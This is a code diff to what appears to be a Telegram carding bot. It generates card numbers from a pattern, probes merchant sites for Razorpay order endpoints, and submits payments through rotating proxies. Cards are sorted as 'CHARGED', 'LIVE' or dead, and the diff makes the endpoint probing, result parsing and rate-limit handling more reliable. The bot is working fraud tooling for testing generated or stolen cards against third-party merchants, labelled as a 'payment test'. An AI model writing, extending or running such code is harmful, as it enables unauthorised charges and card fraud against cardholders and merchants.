@@ -512,9 +512,10 @@ def generate_card(pattern: str) -> Optional[str]:
 
 def gen_cards(pattern: str, count: int):
     """Memory-efficient dedup generator."""
+    from collections import deque
     wsz = min(count, 10_000)
     seen: Set[str] = set()
-    deq: List[str] = []
+    deq: deque = deque()
     gen = att = 0
     while gen < count and att < count * 15:
         att += 1
@@ -522,7 +523,7 @@ def gen_cards(pattern: str, count: int):
         if not c or c in seen:
             continue
         if len(deq) >= wsz:
-            old = deq.pop(0); seen.discard(old)
+            old = deq.popleft(); seen.discard(old)
         seen.add(c); deq.append(c)
         gen += 1
         yield c
@@ -540,14 +541,18 @@ async def fetch_order_id(site_url: str, amount_paise: int,
     Many sites expose /create-order or /order/create endpoints.
     Returns order_id string or None.
     """
-    base = site_url.rstrip("/").rsplit("/", 1)[0]
+    base = site_url.rstrip("/")
+    parsed_base = urlparse(site_url)
+    origin = f"{parsed_base.scheme}://{parsed_base.netloc}"
     candidates = [
+        f"{origin}/create-order",
+        f"{origin}/order/create",
+        f"{origin}/razorpay/order",
+        f"{origin}/payment/order",
+        f"{origin}/api/order",
+        f"{origin}/checkout/create-order",
         f"{base}/create-order",
         f"{base}/order/create",
-        f"{base}/razorpay/order",
-        f"{base}/payment/order",
-        f"{base}/api/order",
-        f"{base}/checkout/create-order",
     ]
     payload = {"amount": amount_paise, "currency": "INR"}
     headers = {
@@ -642,9 +647,12 @@ async def attempt_payment(site_url: str, rzp_key: str, card: str,
                     pid = rj.get("razorpay_payment_id", "")
                     return {"success": True, "charge": True,
                             "resp": f"CHARGED — payment_id: {pid}", "code": str(st), "ts": ts}
-                elif st == 200 and nxt:
+                elif st == 200 and isinstance(nxt, (dict, list)) and nxt:
+                    action = (nxt.get("action") if isinstance(nxt, dict) else
+                              nxt[0].get("action") if isinstance(nxt, list) and nxt else "")
                     return {"success": True, "charge": False,
-                            "resp": "3DS/OTP — card accepted", "code": "3DS", "ts": ts}
+                            "resp": f"3DS/OTP — card accepted ({action or 'redirect'})",
+                            "code": "3DS", "ts": ts}
                 elif "INSUFFICIENT" in code.upper():
                     return {"success": True, "charge": False,
                             "resp": "Insufficient funds — card LIVE", "code": code, "ts": ts}
@@ -1198,6 +1206,7 @@ async def run_payment_test(chat_id: int, amount_paise: int,
     # ── RUN ───────────────────────────────────────
     active_tests[chat_id] = True
     charged = live_ok = dead = batch_n = 0
+    _last_status_edit = 0.0   # throttle status edits to avoid FloodWait
 
     def _status_text():
         return (
@@ -1219,7 +1228,10 @@ async def run_payment_test(chat_id: int, amount_paise: int,
             continue
 
         try:
-            await status_msg.edit_text(_status_text(), parse_mode=ParseMode.HTML)
+            now_t = time.monotonic()
+            if now_t - _last_status_edit >= 3.0:
+                await status_msg.edit_text(_status_text(), parse_mode=ParseMode.HTML)
+                _last_status_edit = now_t
         except Exception:
             pass
 
@@ -1230,7 +1242,8 @@ async def run_payment_test(chat_id: int, amount_paise: int,
             site_url, rzp_key = random.choice(live_sites)
             purl = get_random_proxy_url(proxies)
             res  = await attempt_payment(site_url, rzp_key, card, amount_paise, purl)
-            await redis.incr("bot:stats:total_payments")
+            cur_pays = int(await redis.hget(RK_STATS, "total_payments") or 0)
+            await redis.hset(RK_STATS, "total_payments", str(cur_pays + 1))
 
             if res["success"] and res["charge"]:
                 charged += 1
